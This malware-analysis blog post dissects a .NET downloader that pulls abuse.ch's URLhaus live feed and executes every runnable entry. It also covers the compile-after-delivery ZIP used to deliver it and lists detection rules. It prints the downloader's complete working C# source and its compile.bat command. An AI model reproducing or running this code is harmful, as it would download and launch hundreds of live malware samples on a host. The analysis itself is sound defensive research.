    urlhaus-pelter: An Undocumented .NET Downloader That Executes the Entire URLhaus Live Feed¶

    Summary¶

    While working on an unrelated compromised-opendir case, my daily opendir brief surfaced a .NET console binary as a top hash on the host pivot. Once I pulled it from VirusTotal and read the IL, the sample turned out to be interesting on its own terms. It reads the public URLhaus text_online live-URL feed from abuse.ch,1 filters the feed to malware-adjacent extensions, downloads each match into %TEMP%\7413374368\, and launches it with Process.Start. The compiled sample is byte-equivalent to a May 2023 C# source file that still circulates as part of a compile.bat + loader.txt ZIP delivery pattern. In this post I refer to it as urlhaus-pelter.

    Key Takeaways¶

    • Despite the filename, this is not a loader in the usual sense since it had no selected payload, no C2, and no staging logic. The sample reads abuse.ch's own live-URL feed and runs every matching entry indisriminately - a mass detonator, not a staged loader. A single run on a current Windows host will download and execute every binary - or script-type URL that abuse.ch is tracking at that moment.
    • The pattern is at least two and a half years old. Internal datestamps in the parent ZIP place the source at May 2023, and a simpler sibling variant is dated June 2023. The compiled 2026 sample is byte-identical to the May 2023 source.
    • The documented delivery pattern on VirusTotal is a ~1 KB ZIP with compile.bat + loader.txt that compiles the C# source on the victim using Microsoft's own csc.exe.2 The ZIP pattern is one confirmed pathway. I do not have provenance for how any specific operator actually seeds the compiled binary onto a target.

    Background¶

    Compile-after-delivery is an old LOLBin technique: an operator ships C# or VB.NET source as a plain text file inside a tiny ZIP, a batch file invokes Microsoft's signed csc.exe (or vbc.exe) on the victim to compile that source into a new, locally-produced PE, and the batch runs the result. The PE never traverses the network and never exists on any VirusTotal corpus until a defender finds it and uploads it. MITRE catalogues it as T1127.002 (Trusted Developer Utilities Proxy Execution: Compile After Delivery).2 It has been seen in use by BatLoader and other commodity-crime families.3

    The novelty in the sample below is not the compile-after-delivery wrapper but what the compiled binary does. Rather than embedding a payload, it treats abuse.ch's public URLhaus live-URL feed1 as its payload broker, pulling the feed at runtime and executing every URL whose extension looks locally runnable. URLhaus is the defender resource of record for tracking malware distribution URLs, maintained by abuse.ch as a free public service; it is a feed defenders depend on and that this loader turns inside out.

    How This Sample Surfaced¶

    My daily opendir hunt had flagged a Somali Police Force potentially compromised web directory that was serving a mix of commodity malware like StealC v2.

    When I pulled VirusTotal's host-pivot for that domain, one of the top hashes was a .NET console binary labelled loader.exe.

    Walk the IL¶

    The sample has one class, Program, with one method, Main, and one compiler-generated lambda used as the TLS validation callback. Everything of interest is in Main. Cleaned up for readability:

    public static void Main()
{
    Console.WriteLine("Downloading files, please wait...");

    ServicePointManager.SecurityProtocol =
        SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
    ServicePointManager.ServerCertificateValidationCallback =
        (sender, cert, chain, policy) => true;

    WebClient wc = new WebClient();
    string[] feed = wc.DownloadString(
        "https://urlhaus.abuse.ch/downloads/text_online/").Split('\n');
    wc.Dispose();

    string[] exts = {
        ".exe", ".msi", ".scr", ".ps1", ".bat", ".cmd", ".com", ".lnk",
        ".vbs", ".vbe", ".vb",  ".js",  ".jse", ".jar", ".doc", ".docx",
        ".xlsx", ".xls", ".pdf", ".html", ".hta"
    };

    List<string> urls = feed.Where(l => exts.Any(e =>
        l.Trim().EndsWith(e, StringComparison.CurrentCultureIgnoreCase))).ToList();

    string drop = Path.GetTempPath() + "/7413374368";
    Directory.CreateDirectory(drop);
    Directory.SetCurrentDirectory(drop);

    using WebClient dl = new WebClient();
    foreach (string url in urls)
    {
        string name = url.Split('/').Last();
        try {
            dl.DownloadFile(url, name);
            Process.Start(name);
        } catch { }
    }
}

    Overall, the script acts as an automated, silent malware dropper. Instead of hardcoding a specific payload, it acts as a "live fetcher", scraping a public URLhaus threat intelligence feed in real-time, filtering for file types that Windows will automatically execute, and launching them locally on the infected machine.

    In addition, it filters the downloaded URLs to look exclusively for file extensions that Windows natively launches by default (executables, scripts, office documents, shortcuts, and installers like .exe, .msi, .lnk, .vbs, .ps1, etc.).

    What Runs on Detonation¶

    The URLhaus text_online feed on the day of writing holds roughly 1,800 URLs. Several hundred match the 21-extension filter at any given hour. abuse.ch regenerates the feed as new URLs are reported and as older URLs go offline.

    A single run of loader.exe on a current Windows host will download several hundred live malware samples, drop them all into one folder, and launch each with Process.Start. The payloads currently in the feed include Formbook, Lumma, AsyncRAT, Vidar, DcRat, Remcos, SmokeLoader, GuLoader, Stealc, a selection of ransomware stubs, several commodity cryptominers, and the usual long tail. Many of these conflict with each other at runtime. The result is a host running dozens of unrelated malware processes in parallel.

    For incident responders this breaks the usual one-compromise-one-family assumption. The forensic timeline is populated by concurrent, independent families. Multiple C2 beacons will appear, each belonging to a different infrastructure. Pivoting from an identified payload back to an operator does not work, because the operator never provisioned any of these payloads. abuse.ch did. That is an unusual place to end up as a defender.

    How the Family Ships¶

    I do not have provenance for how any specific operator seeds this binary onto a target. VirusTotal shows the sample has been submitted exactly once, from one source, and has no in-the-wild URL recorded against it. What VirusTotal does show is one documented delivery pattern used by this family: an execution-parent ZIP that compiles the source on the victim.

    VirusTotal's execution-parent graph for fa0fa9fc7935347c38d2f8a5b04f24bbf4d308396bfd7ef1f6fb10fc5c163272 points to a ZIP, 117a5deaf35a81d9a43d73bdcaeca70d98b4d133a103f3f3d5b9b1453635c993. I pulled the ZIP from VT and extracted it. It is 1,184 bytes and contains two files:

    compile.bat    64 bytes
loader.txt   2,442 bytes

    Full compile.bat:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe loader.txt

    Full loader.txt: the exact C# source for the sample above, as plaintext.

    VirusTotal's dynamic analysis of this ZIP (CAPE Sandbox and Zenbox) shows the process tree cmd.exe /c compile.bat → csc.exe loader.txt → cvtres.exe → dropped loader.exe → executed. The dropped loader.exe in the sandbox trace has 55/72 detections on VT and matches our hash.

    A similar_files query on this ZIP returns 40 near-identical siblings on VT, ranging from 771 bytes to about 2 KB and dating back to 2023. The oldest archived variant I pulled directly (f548e6be1fdbcdfccb2143c9e8ab0fba9013a3573511bf886d4e2aca797d2bd3) is dated June 2023 and uses the same compile.bat-style pattern with different filenames (c.bat + a.txt).

    The signed Microsoft C# compiler csc.exe ships with every .NET Framework install since Windows 7. Blocking it outright is not realistic in most environments. Behavioural detection has to key on the chain: one source-dropper ZIP, one .bat compiling a .txt to a new PE, immediate execution of that PE under an unprivileged user context, no developer-tool parent in the process tree.

    The technique is MITRE T1127.002 (Compile After Delivery).2 It is well-documented and has been used by other families, including BatLoader.3 Basically, the novelty here is the payload, not the delivery.

    Whether the ZIP pathway is the only way the family ships is not something I can determine from the evidence I have. VirusTotal has 40 similar ZIP siblings on this template going back to 2023, which makes it the dominant documented delivery, but it does not rule out other packagings.

    Attribution¶

    I did not identify a tracked threat actor behind this family. No public write-up names the family. Microsoft's !MTB suffix on the Defender tag denotes malware produced by a shared source template, which is consistent with the file inventory. The authorial fingerprint across variants is consistent (Array.Resize in a loop rather than LINQ, prank-themed sibling filenames, no obfuscation, bugs the author never caught) and points to a code-sharing origin rather than an operator-maintained toolset.

    When it comes to naming, I named it urlhaus-pelter. "Pelter" because the sample pelts the victim with every URL on the feed. "URLhaus" because the feed is the sole payload broker.

    Detection and Mitigation¶

    If you are defending against this, these are the rules I would recommend:

    • Alert on any process tree where cmd.exe or Explorer launches csc.exe <*.txt> and the resulting PE is immediately executed under %TEMP% or the current working directory, with a parent process that is not a known developer tool (Visual Studio, MSBuild, dotnet CLI, PowerShell developer session). Developer compilation from a command line is near-zero in most enterprise environments.
    • Do not block urlhaus.abuse.ch at the perimeter. Defenders need the feed. Alert instead on any endpoint that is not a sandbox, a defender workstation, or a threat-intel ingestion host and that nonetheless resolves and fetches the /downloads/text_online/ path.
    • Sysmon file-create (event ID 11) under %TEMP%\7413374368\ with any extension in the 21-extension set should fire a high-severity alert. The drop-directory name is unique enough to key on by itself.
    • AppLocker or WDAC: restrict csc.exe to Visual Studio-adjacent paths and parent processes.
